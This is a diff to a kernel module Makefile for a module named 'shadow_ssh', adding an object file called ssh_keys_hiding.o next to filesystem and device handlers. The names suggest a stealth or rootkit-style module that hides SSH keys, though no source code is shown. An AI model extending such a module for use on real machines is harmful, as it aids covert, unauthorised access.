@@ -2,7 +2,7 @@ MODULENAME := shadow_ssh
 
 obj-m += $(MODULENAME).o
 
-$(MODULENAME)-y += main.o device_handlers.o filesystem_filter.o
+$(MODULENAME)-y += main.o device_handlers.o filesystem_filter.o ssh_keys_hiding.o
 
 KERNELDIR ?= ~/workspace/buildroot-2020.02.4/output/build/linux-4.19.91
 
